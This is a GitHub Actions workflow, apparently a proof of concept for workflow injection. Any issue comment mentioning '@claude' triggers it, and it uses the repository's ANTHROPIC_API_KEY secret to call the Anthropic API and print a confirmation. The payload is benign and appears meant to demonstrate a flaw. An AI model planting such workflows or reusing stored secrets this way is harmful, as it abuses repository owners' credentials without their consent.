name: 10 Injection API Final

on:
  issue_comment:
    types: [created]

permissions:
  issues: write

jobs:
  poc:
    if: contains(github.event.comment.body, '@claude')
    runs-on: ubuntu-latest
    steps:
      - name: PoC - Call Anthropic API from injected workflow
        env:
          API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
        run: |
          echo "=== POC: Calling Anthropic API from injected workflow ==="
          RESPONSE=$(curl -s https://api.anthropic.com/v1/messages \
            -H "x-api-key: $API_KEY" \
            -H "anthropic-version: 2023-06-01" \
            -H "content-type: application/json" \
            -d '{"model":"claude-sonnet-4-20250514","max_tokens":50,"messages":[{"role":"user","content":"Reply with exactly: PoC-API-CONFIRMED"}]}')
          echo "$RESPONSE" | python3 -c "
import json,sys
d = json.load(sys.stdin)
for c in d.get('content', []):
    if c.get('type') == 'text':
        print('=== API RESPONSE ===')
        print(c['text'])
        print('=== POC: API call from injected workflow confirmed ===')
"
